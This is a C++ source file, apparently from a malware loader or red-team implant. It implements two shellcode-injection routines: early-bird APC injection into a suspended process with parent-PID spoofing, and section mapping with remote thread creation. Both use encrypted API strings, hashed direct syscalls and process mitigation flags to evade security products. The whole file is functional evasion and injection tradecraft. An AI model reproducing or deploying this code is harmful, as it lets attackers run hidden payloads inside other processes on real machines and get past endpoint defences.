#ifdef INJECT_EXTERNAL_EBAPC

#include "../static/vars.hpp"
#include "../hash/hashes.hpp"
#include <cstdio>
#include <vector>
#include "windows.h"
#include "../syscall/syscall.hpp"
#include "../decrypt/decrypt.hpp"

EXTERN_C NTSTATUS sysNtOpenProcess(
  PHANDLE ProcessHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PCLIENT_ID ClientId
);

int inject(std::vector<unsigned char> bytecode, int ppid) {

  unsigned char eSuspendThread[] = {
    0x41, 0x45, 0x53, 0x47, 0x01, 0x10, 0x87, 0x8a, 0x84, 0x6d, 0x52, 0x73,
    0x2b, 0xdb, 0x15, 0x7f, 0x21, 0xc1, 0x2b, 0xb3, 0x84, 0x87, 0x0c, 0xdd,
    0xb0, 0x33, 0x4a, 0x94, 0xee, 0xc2, 0x32, 0xc5, 0x12, 0x0f, 0x60, 0x3d,
    0xad, 0x5f, 0x73, 0x70, 0xeb, 0x1c, 0x67, 0x81, 0x6e, 0xdc, 0xef, 0x69,
    0xd5, 0x0a, 0xd4, 0xe7, 0x6f, 0xe0, 0x0a, 0x8c, 0x28, 0x7a, 0x9d, 0xaa,
    0x58, 0x91, 0x61, 0xe8, 0x01
  };

  unsigned char eKernel32Dll[] = {
    0x41, 0x45, 0x53, 0x47, 0x01, 0x10, 0xe7, 0xce, 0x0a, 0xe2, 0x40, 0x9c,
    0xea, 0xde, 0x07, 0xfa, 0xff, 0xd0, 0xd3, 0xb6, 0x3e, 0x7f, 0x0c, 0x54,
    0xd5, 0x35, 0xc5, 0xa7, 0xf2, 0xcd, 0x8a, 0xbd, 0x59, 0xc1, 0xc5, 0xe5,
    0x96, 0xba, 0x75, 0xe2, 0xd2, 0x82, 0x4f, 0x51, 0x8e, 0x5d, 0x0c, 0x99,
    0xfe, 0x5b, 0x8c, 0x85, 0x59, 0x99, 0x21, 0x70, 0x45, 0x93, 0xa1, 0x56
  };

  unsigned char eCreateProcessA[] = {
    0x41, 0x45, 0x53, 0x47, 0x01, 0x10, 0x74, 0xb1, 0x13, 0xa2, 0x99, 0x56,
    0x71, 0x26, 0x35, 0x41, 0x31, 0x5f, 0x61, 0x53, 0x7d, 0x6b, 0x0c, 0xfd,
    0x60, 0x0c, 0x90, 0x20, 0x77, 0xd3, 0xdb, 0x32, 0x80, 0x0e, 0xa2, 0xf4,
    0xe7, 0x45, 0x34, 0x47, 0x96, 0xad, 0x8e, 0x9f, 0x2b, 0x71, 0x23, 0xe5,
    0xed, 0xa0, 0x55, 0x9b, 0x4d, 0x83, 0xb7, 0xc5, 0xff, 0x96, 0x64, 0x9b,
    0x24, 0xdb, 0x05, 0xcf, 0xab, 0x07
  };

  std::vector<unsigned char> vecECreateProcessA(std::begin(eCreateProcessA), std::end(eCreateProcessA));
  std::vector<unsigned char> vecESuspendThread(std::begin(eSuspendThread), std::end(eSuspendThread));
  std::vector<unsigned char> vecEKernel32Dll(std::begin(eKernel32Dll), std::end(eKernel32Dll));

  std::vector<unsigned char> decodedCreateProc = decrypt_bytecode(vecECreateProcessA);
  std::vector<unsigned char> decodedSuspend = decrypt_bytecode(vecESuspendThread);
  std::vector<unsigned char> decodedKernel32 = decrypt_bytecode(vecEKernel32Dll);

  LPCSTR sCrP = reinterpret_cast<LPCSTR>(decodedCreateProc.data());
  LPCSTR sSus = reinterpret_cast<LPCSTR>(decodedSuspend.data());
  LPCSTR win32 = reinterpret_cast<LPCSTR>(decodedKernel32.data());

  unsigned int bytecode_size = bytecode.size();
	SIZE_T bytecode_size2 = bytecode.size();
	ULONG shcSize = (ULONG)bytecode_size;
	
	STARTUPINFOEXA sie;
	PROCESS_INFORMATION pi;
	ZeroMemory(&sie, sizeof(sie));
	ZeroMemory(&pi, sizeof(pi));
	sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	sie.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

  PVOID BaseAddress = NULL;


	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProc = NULL;

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;


	OBJECT_ATTRIBUTES pObjectAttributes;
	InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pClientId;
	pClientId.UniqueProcess = (PVOID)ppid;
	pClientId.UniqueThread = (PVOID)0;

	NTSTATUS NtOpenProcessstatus = call(hashNtDll, hashNtOpenProcess, sysNtOpenProcess, &hParentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);

	SIZE_T size = 0;
	InitializeProcThreadAttributeList(NULL, 2, 0, &size);
	sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
	InitializeProcThreadAttributeList(sie.lpAttributeList, 2, 0, &size);

	using SuspendThreadPrototype = DWORD(WINAPI*)(HANDLE);
	SuspendThreadPrototype SuspendThread = (SuspendThreadPrototype)GetProcAddress(GetModuleHandleA(win32), sSus);

	using CreateProcessAPrototype = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
	CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(GetModuleHandleA(win32), sCrP);

	CreateProcessA((LPSTR)TARGET_PROCESS, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &sie.StartupInfo, &pi);

	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	NTSTATUS status1 = call(hashNtDll, hashNtAllocateVirtualMemory, sysNtAllocateVirtualMemory, hProcess, &BaseAddress, 0, &bytecode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  NTSTATUS NtWriteStatus1 = call(hashNtDll, hashNtWriteVirtualMemory, sysNtWriteVirtualMemory, hProcess, BaseAddress, bytecode.data(), shcSize, (PULONG)NULL);
	
	DWORD OldProtect = 0;

	NTSTATUS NtProtectStatus1 = call(hashNtDll, hashNtProtectVirtualMemory, sysNtProtectVirtualMemory, hProcess, &BaseAddress, &bytecode_size2, PAGE_EXECUTE_READ, &OldProtect);

	LPVOID pAlloc = BaseAddress;

  NTSTATUS NtQueueApcThreadStatus1 = call(hashNtDll, hashNtQueueApcThread, sysNtQueueApcThread, hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, (PIO_STATUS_BLOCK)nullptr, NULL);

	DWORD ret = ResumeThread(pi.hThread);

	return 0;

}

#elifdef INJECT_EXTERNAL_CREATE_MAP_SECTION

#include "../static/vars.hpp"
#include "../hash/hashes.hpp"
#include <cstdio>
#include "../search/findpid.hpp"
#include "../syscall/syscall.hpp"
#include <vector>
#include <windows.h>
#include "../static/debug.hpp"

EXTERN_C NTSTATUS sysNtCreateSection(
  PHANDLE            SectionHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PLARGE_INTEGER     MaximumSize,
  ULONG              SectionPageProtection,
  ULONG              AllocationAttributes,
  HANDLE             FileHandle
);

EXTERN_C NTSTATUS sysNtMapViewOfSection(
  HANDLE          SectionHandle,
  HANDLE          ProcessHandle,
  PVOID           *BaseAddress,
  ULONG_PTR       ZeroBits,
  SIZE_T          CommitSize,
  PLARGE_INTEGER  SectionOffset,
  PSIZE_T         ViewSize,
  SECTION_INHERIT InheritDisposition,
  ULONG           AllocationType,
  ULONG           Win32Protect
);

EXTERN_C NTSTATUS sysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCOBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PUSER_THREAD_START_ROUTINE StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

int inject(std::vector<unsigned char> bytecode, int ppid) {

  DEBUG_INFO("Starting injection routine.");
  DEBUG_INFO("Payload size: %zu bytes", bytecode.size());

  HANDLE hSection = NULL;
  SIZE_T size = bytecode.size();
  LARGE_INTEGER sectionMaxSize;
  sectionMaxSize.QuadPart = size;
  PVOID localSectionBase = NULL;
  PVOID remoteSectionBase = NULL;

  // 1. Create an RWX section of `size`
  DEBUG_INFO("Calling NtCreateSection...");
  NTSTATUS createSectionStatus = call(
    hashNtDll,
    hashNtCreateSection,
    sysNtCreateSection,

    &hSection,
    SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
    nullptr,
    &sectionMaxSize,
    PAGE_EXECUTE_READWRITE,
    SEC_COMMIT,
    (HANDLE)NULL
  );

  if (!NT_SUCCESS(createSectionStatus)) {
      DEBUG_ERR("NtCreateSection failed with NTSTATUS: 0x%lX", createSectionStatus);
      return -1;
  }
  DEBUG_INFO("NtCreateSection successful. Section Handle: %p", hSection);

  HANDLE hCurrentProcess = GetCurrentProcess();
  DEBUG_INFO("Mapping view of section into the current process address space...");
  NTSTATUS localMapStatus = call(
    hashNtDll,
    hashNtMapViewOfSection,
    sysNtMapViewOfSection,

    hSection,
    hCurrentProcess,
    &localSectionBase,
    (ULONG_PTR)NULL,
    (SIZE_T)NULL,
    (PLARGE_INTEGER)NULL,
    &size,
    (SECTION_INHERIT)2,    // ViewUnmap (don't map into any child processes)
    (ULONG)NULL,
    PAGE_READWRITE
  );

  if (!NT_SUCCESS(localMapStatus)) {
      DEBUG_ERR("Local NtMapViewOfSection failed with NTSTATUS: 0x%lX", localMapStatus);
      return -1;
  }
  DEBUG_INFO("Local map successful. Base Address: %p", localSectionBase);

  // Find target process PID and get a handle
  DWORD targetProcessId = findProcessId(TARGET_PROCESS);
  DEBUG_INFO("Target Process: %ls | PID found: %lu", TARGET_PROCESS, targetProcessId);

  if (targetProcessId == 0) {
      DEBUG_ERR("Failed to find target process.");
      return -1;
  }

  DEBUG_INFO("Attempting to open handle to target process...");
  HANDLE hTargetProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    targetProcessId
  );

  if (hTargetProcess == NULL) {
      DEBUG_ERR("OpenProcess failed. Error Code: %lu", GetLastError());
      return -1;
  }
  DEBUG_INFO("Target process opened successfully. Handle: %p", hTargetProcess);

  DEBUG_INFO("Mapping view of section into the target process address space (PAGE_EXECUTE_READ)...");
  NTSTATUS remoteMapStatus = call(
    hashNtDll,
    hashNtMapViewOfSection,
    sysNtMapViewOfSection,

    hSection,
    hTargetProcess,
    &remoteSectionBase,
    (ULONG_PTR)NULL,
    (SIZE_T)NULL,
    (PLARGE_INTEGER)NULL,
    &size,
    (SECTION_INHERIT)2,
    (ULONG)NULL,
    PAGE_EXECUTE_READ
  );

  if (!NT_SUCCESS(remoteMapStatus)) {
      DEBUG_ERR("Remote NtMapViewOfSection failed with NTSTATUS: 0x%lX", remoteMapStatus);
      return -1;
  }
  DEBUG_INFO("Remote map successful. Remote Base Address: %p", remoteSectionBase);

  // Copy shellcode to the local view, which will get reflected in the target process's mapped view
  DEBUG_INFO("Copying bytecode to local section view...");
  memcpy(localSectionBase, bytecode.data(), bytecode.size());
  DEBUG_INFO("Bytecode copied successfully.");

  HANDLE hTargetThread = NULL;
  DEBUG_INFO("Executing shellcode via NtCreateThreadEx in the remote process...");
  NTSTATUS threadStatus = call(
    hashNtDll,
    hashNtCreateThreadEx,
    sysNtCreateThreadEx,

    &hTargetThread,
    THREAD_ALL_ACCESS,
    (PCOBJECT_ATTRIBUTES)NULL,
    hTargetProcess,
    (PUSER_THREAD_START_ROUTINE)remoteSectionBase,
    (PVOID)NULL,
    0,
    0,
    0,
    0,
    (PPS_ATTRIBUTE_LIST)NULL
  );

  if (!NT_SUCCESS(threadStatus)) {
      DEBUG_ERR("NtCreateThreadEx failed with NTSTATUS: 0x%lX", threadStatus);
      return -1;
  }
  DEBUG_INFO("Thread created successfully! Thread Handle: %p", hTargetThread);
  DEBUG_INFO("Injection routine completed.");

  return 0;
}

#endif
